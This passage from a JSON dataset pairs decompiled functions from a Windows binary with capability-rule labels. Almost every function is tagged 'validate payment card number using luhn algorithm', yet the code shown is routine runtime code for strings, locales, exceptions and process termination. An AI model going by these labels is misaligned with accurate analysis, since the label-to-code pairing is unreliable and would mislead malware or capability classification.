        "decompiled_code": "\nvoid __fastcall fcn.004030d5(uint param_1, uint param_2, uint param_3, uint param_4)\n\n{\n    fcn.00402e7d(param_4, param_1, param_2);\n    return;\n}\n",
        "token_count": 57
    },
    "004030e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004030e4(uint arg_8h)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    for (puVar1 = *(in_ECX + 0x2c); puVar1 != NULL; puVar1 = *puVar1) {\n        pcVar2 = puVar1[2];\n        (**0x573000)(arg_8h);\n        (*pcVar2)();\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "004030f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004030f8(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = *(param_1 + 0x404);\n    iVar2 = fcn.00405911();\n    if (iVar1 == 0) {\n        iVar2 = iVar2 + param_1;\n    }\n    else {\n        iVar2 = iVar2 + iVar1;\n    }\n    return iVar2;\n}\n",
        "token_count": 105
    },
    "00403107": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.00403107(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    float10 in_ST0;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    \n    fcn.004035b2();\n    return in_ST0;\n}\n",
        "token_count": 88
    },
    "0040318e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040318e(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        cVar2 = fcn.00405d21(unaff_EBX & 0xffffff00 | uVar1);\n        if (cVar2 == '\\0') {\n            *(param_1 + 0x18) = 0xffffffff;\n        }\n        else {\n            *(param_1 + 0x18) = *(param_1 + 0x18) + 1;\n        }\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 329
    },
    "004031b6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nushort * __cdecl fcn.004031b6(char *arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    ushort *puVar4;\n    char *pcVar5;\n    char *lpMultiByteStr;\n    int32_t iVar6;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    ushort *var_ch;\n    char *var_8h;\n    uint var_4h;\n    \n    var_14h = 0;\n    var_10h = 0;\n    pcVar5 = arg_8h;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    iVar6 = 0;\n    pcVar5 = pcVar5 + (1 - (arg_8h + 1));\n    var_8h = pcVar5;\n    lpMultiByteStr = arg_8h;\n    while ((pcVar5 != NULL && (iVar3 = fcn.00403cdd(&var_4h, lpMultiByteStr, pcVar5, &var_14h, arg_10h),  0 < iVar3))) {\n        lpMultiByteStr = lpMultiByteStr + iVar3;\n        iVar6 = iVar6 + 1;\n        pcVar5 = pcVar5 + -iVar3;\n    }\n    iVar6 = iVar6 + 1;\n    var_ch = fcn.00403387(iVar6, 2);\n    if (var_ch != NULL) {\n        var_1ch = 0;\n        var_18h = 0;\n        puVar4 = var_ch;\n        while ((iVar6 != 0 && (iVar3 = fcn.00403cdd(puVar4, arg_8h, var_8h, &var_1ch, arg_10h),  0 < iVar3))) {\n            arg_8h = arg_8h + iVar3;\n            puVar4 = puVar4 + 1;\n            iVar6 = iVar6 + -1;\n        }\n        *puVar4 = 0;\n        return var_ch;\n    }\n    fcn.004010a5();\n    pcVar2 = swi(3);\n    puVar4 = (*pcVar2)();\n    return puVar4;\n}\n",
        "token_count": 543
    },
    "00418870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00418870(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint arg_8h)\n\n{\n    code *pcVar1;\n    code **in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_8h;\n    code **var_20h;\n    uint *puStack32;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puStack32 = &var_20h;\n    var_14h = 0x41e320;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *in_ECX = vtable.std::exception.0;\n    in_ECX[2] = NULL;\n    in_ECX[1] = NULL;\n    var_10h = 0;\n    var_20h = in_ECX;\n    fcn.00402dd3(var_8h + 4, in_ECX + 1);\n    *var_20h = vtable.std::_System_error.0;\n    pcVar1 = *(var_8h + 0xc);\n    var_20h[4] = *(var_8h + 0x10);\n    var_20h[3] = pcVar1;\n    *var_20h = vtable.std::ios_base::failure.0;\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 365
    },
    "004032d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004032d8(uint *arg_8h, uint arg_ch, uint arg_10h, uint16_t *arg_14h, int32_t arg_18h)\n\n{\n    if (arg_18h != 0) {\n        do {\n            fcn.0040637f(*arg_14h);\n            arg_14h = arg_14h + 1;\n            arg_18h = arg_18h + -1;\n        } while (arg_18h != 0);\n    }\n    *arg_8h = arg_ch;\n    arg_8h[1] = arg_10h;\n    return;\n}\n",
        "token_count": 145
    },
    "004033eb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004033eb(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7fffffffU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.0040566e(iVar1 + arg_8h, arg_ch, 0x7fffffff);\n        iVar4 = fcn.00406000(iVar3 + 1);\n        in_ECX[4] = iVar1 + arg_8h;\n        in_ECX[5] = iVar3;\n        if (arg_ch < 0x10) {\n            fcn.0040576d(iVar4, in_ECX, iVar1);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 1 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.0040576d(iVar4, iVar3, iVar1);\n            *(iVar1 + iVar4) = arg_10h;\n            *(iVar1 + 1 + iVar4) = 0;\n            fcn.00401659(iVar3, arg_ch + 1);\n        }\n        *in_ECX = iVar4;\n        return in_ECX;\n    }\n    fcn.004038aa();\n    pcVar2 = swi(3);\n    piVar5 = (*pcVar2)();\n    return piVar5;\n}\n",
        "token_count": 411
    },
    "0040343b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040343b(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t arg_14h_00;\n    int32_t arg_1ch;\n    \n    arg_14h_00 = arg_ch - arg_8h >> 1;\n    arg_1ch = arg_14h - arg_10h >> 1;\n    if (arg_18h == 0) {\n        arg_18h = fcn.0040379c();\n    }\n    if (*(arg_18h + 4) == 0) {\n        iVar1 = arg_14h_00;\n        if (arg_1ch <= arg_14h_00) {\n            iVar1 = arg_1ch;\n        }\n        iVar1 = fcn.00401299(arg_8h, arg_10h, iVar1);\n        if ((iVar1 == 0) && (arg_14h_00 != arg_1ch)) {\n            iVar1 = (arg_1ch <= arg_14h_00) * 2 + -1;\n        }\n    }\n    else {\n        iVar1 = fcn.00403d64(*(arg_18h + 4), 0x1000, arg_8h, arg_14h_00, arg_10h, arg_1ch);\n        if (iVar1 == 0) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            iVar1 = 0x7fffffff;\n        }\n        else {\n            iVar1 = iVar1 + -2;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 402
    },
    "00403440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint16_t __cdecl fcn.00403440(uint16_t *arg_8h, uint16_t **arg_ch)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    uint16_t uVar3;\n    \n    uVar3 = 0;\n    iVar2 = 0;\n    uVar1 = *arg_8h;\n    do {\n        if ((uVar1 != *(L\"IND)\" + iVar2)) && (uVar1 != *(L\"ind)\" + iVar2))) goto code_r0x004b44d0;\n        iVar2 = iVar2 + 2;\n        uVar1 = **arg_ch;\n        *arg_ch = *arg_ch + 1;\n        *arg_8h = uVar1;\n    } while (iVar2 != 8);\n    uVar3 = 1;\ncode_r0x004b44d0:\n    return uVar1 & 0xff00 | uVar3;\n}\n",
        "token_count": 210
    },
    "0047a212": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0047a212(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    fcn.00404f20(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 53
    },
    "00403490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403490(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    uint32_t arg_ch;\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_ECX;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_8h < 0x80000000) {\n        arg_ch = in_ECX[5];\n        iVar2 = fcn.0040566e(arg_8h, arg_ch, 0x7fffffff);\n        iVar3 = fcn.00406000(iVar2 + 1);\n        in_ECX[4] = arg_8h;\n        in_ECX[5] = iVar2;\n        fcn.0040576d(iVar3, arg_10h, arg_8h);\n        *(iVar3 + arg_8h) = 0;\n        if (0xf < arg_ch) {\n            fcn.00401659(*in_ECX, arg_ch + 1);\n        }\n        *in_ECX = iVar3;\n        return;\n    }\n    fcn.004038aa();\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 283
    },
    "0040349f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040349f(void)\n\n{\n    uint32_t in_EAX;\n    uint *puVar1;\n    uchar *puVar2;\n    uint *puVar3;\n    uint unaff_retaddr;\n    uchar auStack4 [4];\n    \n    puVar2 = in_EAX + (&stack0x00000004 + -in_EAX & 0xf) | -CARRY4(in_EAX, &stack0x00000004 + -in_EAX & 0xf);\n    puVar3 = &stack0x00000000 - puVar2 & ~-(*0x10 < puVar2);\n    for (puVar1 = auStack4 & 0xfffff000; puVar3 < puVar1; puVar1 = puVar1 + -0x400) {\n    }\n    *puVar3 = unaff_retaddr;\n    return;\n}\n",
        "token_count": 193
    },
    "004034ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004034ae(int32_t param_1)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t unaff_EBX;\n    \n    uVar1 = *(param_1 + 0x31);\n    *(param_1 + 0x3c) = 0;\n    iVar3 = fcn.004060eb(***(param_1 + 8), uVar1, 0x8000);\n    if (iVar3 != 0) {\n        fcn.00403d5f(unaff_EBX & 0xffffff00 | uVar1, param_1 + 0x18);\n        cVar2 = **(param_1 + 0x10);\n        *(param_1 + 0x31) = cVar2;\n        *(param_1 + 0x10) = *(param_1 + 0x10) + 1;\n        if (cVar2 == '\\0') {\n            puVar4 = fcn.004039a4();\n            *puVar4 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 274
    },
    "004034cc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004034cc(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004054b6(arg_8h, *arg_10h, arg_ch - arg_8h);\n    if (iVar1 == 0) {\n        iVar1 = arg_ch;\n    }\n    return iVar1;\n}\n",
        "token_count": 97
    },
    "004034d1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.004034d1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t CodePage;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t arg_14h_00;\n    uint32_t arg_1ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_14h_00 = arg_14h - arg_10h;\n    arg_1ch = arg_ch - arg_8h;\n    if (arg_18h == NULL) {\n        iVar1 = fcn.0040379c();\n        iVar1 = *(iVar1 + 4);\n        CodePage = fcn.0040550b();\n    }\n    else {\n        iVar1 = arg_18h[1];\n        CodePage = *arg_18h;\n    }\n    if ((iVar1 == 0) && (CodePage == 0)) {\n        uVar3 = arg_14h_00;\n        if (arg_14h_00 <= arg_1ch) {\n            fcn.0040576d(arg_8h, arg_10h, arg_14h_00);\n        }\n    }\n    else {\n        uVar2 = fcn.00402b53(iVar1, 0x400, arg_10h, arg_14h_00, 0, 0, CodePage, 1);\n        uVar3 = 0xffffffff;\n        if ((uVar2 != 0) && (uVar3 = uVar2,  uVar2 <= arg_1ch)) {\n            fcn.00402b53(iVar1, 0x400, arg_10h, arg_14h_00, arg_8h, arg_1ch, CodePage, 1);\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 443
    },
    "004035b2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004035b2(int32_t param_1, int32_t *param_2, uint16_t *param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uint32_t uStack148;\n    uchar auStack144 [48];\n    ulong uStack96;\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    uStack20 = *0x56cca8 ^ &stack0xfffffff0;\n    uStack148 = *param_3;\n    iVar2 = *param_2;\n    if (iVar2 == 1) {\ncode_r0x004de139:\n        arg_8h = 8;\ncode_r0x004de13b:\n        iVar2 = fcn.00402f3b(arg_8h, param_2 + 6, uStack148);\n        if (iVar2 == 0) {\n            if (((param_1 == 0x10) || (param_1 == 0x16)) || (param_1 == 0x1d)) {\n                uStack96 = *(param_2 + 4);\n                uStack80 = uStack80 & 0xffffffe3 | 3;\n            }\n            else {\n                uStack80 = uStack80 & 0xfffffffe;\n            }\n            fcn.004043a9(auStack144, &uStack148, arg_8h, param_1, param_2 + 2, param_2 + 6);\n        }\n    }\n    else {\n        if (iVar2 == 2) {\n            arg_8h = 4;\n            goto code_r0x004de13b;\n        }\n        if (iVar2 == 3) {\n            arg_8h = 0x11;\n            goto code_r0x004de13b;\n        }\n        if (iVar2 == 4) {\n            arg_8h = 0x12;\n            goto code_r0x004de13b;\n        }\n        if (iVar2 == 5) goto code_r0x004de139;\n        if (iVar2 == 8) {\n            arg_8h = 0x10;\n            goto code_r0x004de13b;\n        }\n    }\n    fcn.004051a0(uStack148, 0xffff);\n    if (*param_2 != 8) {\n        cVar1 = fcn.00404840();\n        if (cVar1 != '\\0') {\n            iVar2 = fcn.00402fae(param_2);\n            if (iVar2 != 0) goto code_r0x004de1c8;\n        }\n    }\n    fcn.00403cec(*param_2);\ncode_r0x004de1c8:\n    fcn.00403085(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 630
    },
    "004035f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004035f8(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsProcessorFeaturePresent)(0x17);\n    if (iVar2 != 0) {\n        pcVar1 = swi(0x29);\n        (*pcVar1)();\n    }\n    fcn.00405998(2, 0xc0000417, 1);\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000417);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar3);\n    return;\n}\n",
        "token_count": 149
    },
    "00403602": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00403602(int16_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    int16_t **arg_8h_00;\n    int16_t **arg_10h_00;\n    int16_t *arg_10h_01;\n    ushort *arg_8h_01;\n    int16_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t arg_8h_02;\n    uint uVar5;\n    int16_t *piVar6;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404331();\n    arg_8h_00 = iVar3 + 0x50;\n    arg_10h_01 = iVar3 + 0x2a0;\n    *(iVar3 + 0x58) = 0;\n    *arg_10h_01 = 0;\n    arg_10h_00 = iVar3 + 0x54;\n    *arg_8h_00 = arg_8h;\n    *arg_10h_00 = arg_8h + 0x40;\n    piVar6 = arg_8h;\n    if (arg_8h[0x40] != 0) {\n        fcn.004cc450(0x5539b8, 0x16, arg_10h_00);\n        piVar6 = *arg_8h_00;\n    }\n    if (*piVar6 == 0) {\n        fcn.004cbbc9(arg_8h_00);\n    }\n    else {\n        if (**arg_10h_00 == 0) {\n            fcn.004cbd30(arg_8h_00);\n        }\n        else {\n            fcn.004cbc71(arg_8h_00);\n        }\n        if ((*(iVar3 + 0x58) == 0) && (iVar4 = fcn.004cc450(0x553608, 0x40, arg_8h_00),  iVar4 != 0)) {\n            if (**arg_10h_00 == 0) {\n                fcn.004cbd30(arg_8h_00);\n            }\n            else {\n                fcn.004cbc71(arg_8h_00);\n            }\n        }\n    }\n    if (*(iVar3 + 0x58) != 0) {\n        if ((*arg_8h == 0) && (arg_8h[0x80] == 0)) {\n            arg_8h_02 = (*_sym.imp.KERNEL32.dll_GetACP)();\n        }\n        else {\n            arg_8h_02 = fcn.004cc266(arg_8h + 0x80, arg_8h_00);\n        }\n        if (((arg_8h_02 != 0) && (arg_8h_02 != 65000)) &&\n           (iVar4 = (*_sym.imp.KERNEL32.dll_IsValidCodePage)(arg_8h_02 & 0xffff),  iVar4 != 0)) {\n            if (arg_ch != NULL) {\n                *arg_ch = arg_8h_02;\n            }\n            if (arg_10h == 0) {\n                return 1;\n            }\n            arg_8h_01 = arg_10h + 0x120;\n            *arg_8h_01 = 0;\n            piVar6 = arg_10h_01;\n            do {\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            iVar3 = fcn.00405a92(arg_8h_01, 0x55, arg_10h_01, (piVar6 - (iVar3 + 0x2a2) >> 1) + 1);\n            if (iVar3 != 0) {\ncode_r0x004cc6c6:\n                fcn.004035f8(0, 0, 0, 0, 0);\n                pcVar2 = swi(3);\n                uVar5 = (*pcVar2)();\n                return uVar5;\n            }\n            iVar3 = fcn.00404746(arg_8h_01, 0x1001, arg_10h, 0x40);\n            if (iVar3 != 0) {\n                iVar3 = arg_10h + 0x80;\n                iVar4 = fcn.00404746(arg_10h + 0x120, 0x1002, iVar3, 0x40);\n                if ((iVar4 != 0) &&\n                   (((iVar4 = fcn.0040505b(iVar3, 0x5f),  iVar4 == 0 && (iVar4 = fcn.0040505b(iVar3, 0x2e),  iVar4 == 0)\n                     ) || (iVar3 = fcn.00404746(arg_10h + 0x120, 7, iVar3, 0x40),  iVar3 != 0)))) {\n                    if (arg_8h_02 != 0xfde9) {\n                        fcn.0040446c(arg_8h_02, arg_10h + 0x100, 0x10, 10);\n                        return 1;\n                    }\n                    iVar3 = fcn.00405a92(arg_10h + 0x100, 0x10, L\"utf8\", 5);\n                    if (iVar3 == 0) {\n                        return 1;\n                    }\n                    goto code_r0x004cc6c6;\n                }\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 1266
    },
    "00403607": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403607(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint arg_ch_00;\n    uint arg_10h_00;\n    uint arg_18h;\n    \n    arg_18h = 1;\n    fcn.00405885(&stack0xffffffe8, arg_8h, arg_ch);\n    fcn.00403c2e(0, arg_ch_00, arg_10h_00, arg_10h, arg_18h);\n    return;\n}\n",
        "token_count": 120
    },
    "0040365c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040365c(int32_t param_1)\n\n{\n    int32_t *arg_8h;\n    int32_t iVar1;\n    uint uVar2;\n    \n    arg_8h = param_1 + 0x28;\n    if (*(param_1 + 0x31) != '*') {\n        uVar2 = fcn.00405871(arg_8h);\n        return uVar2;\n    }\n    *(param_1 + 0x14) = *(param_1 + 0x14) + 4;\n    iVar1 = *(*(param_1 + 0x14) + -4);\n    *arg_8h = iVar1;\n    if (iVar1 < 0) {\n        *arg_8h = -1;\n    }\n    return CONCAT31(iVar1 >> 8, 1);\n}\n",
        "token_count": 190
    },
    "00403684": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403684(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 != 0) {\n        if (iVar1 < 8) {\n            fcn.0040204a(iVar1 * 0x18 + 0x56f128);\n        }\n        return;\n    }\n    fcn.00401cbc(4);\n    return;\n}\n",
        "token_count": 101
    },
    "0040369d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040369d(int16_t *arg_8h, int16_t *arg_ch)\n\n{\n    int16_t iVar1;\n    int16_t *piVar2;\n    int16_t *piVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    piVar2 = arg_8h;\n    if (*arg_8h != 0) {\n        do {\n            if (*arg_ch != 0) {\n                piVar3 = arg_ch;\n                iVar1 = *arg_ch;\n                do {\n                    if (*piVar2 == iVar1) goto code_r0x004cb585;\n                    piVar3 = piVar3 + 1;\n                    iVar1 = *piVar3;\n                } while (iVar1 != 0);\n            }\n            piVar2 = piVar2 + 1;\n        } while (*piVar2 != 0);\n    }\ncode_r0x004cb585:\n    return piVar2 - arg_8h >> 1;\n}\n",
        "token_count": 224
    },
    "004036d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004036d4(uint arg_8h)\n\n{\n    uint var_4h;\n    \n    fcn.004055d3(&var_4h, 0x1f);\n    fcn.004d61f1(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 69
    },
    "004036f2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004036f2(uint arg_8h)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    pcVar1 = fcn.004c8177(0x1d, \"AppPolicyGetThreadInitializationType\", 0x553534, \"AppPolicyGetThreadInitializationType\"\n                         );\n    if (pcVar1 == NULL) {\n        uVar2 = 0xc0000225;\n    }\n    else {\n        (**0x573000)(0xfffffffa, arg_8h);\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 136
    },
    "00403710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00403710(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.004020f9(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 85
    },
    "00403724": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
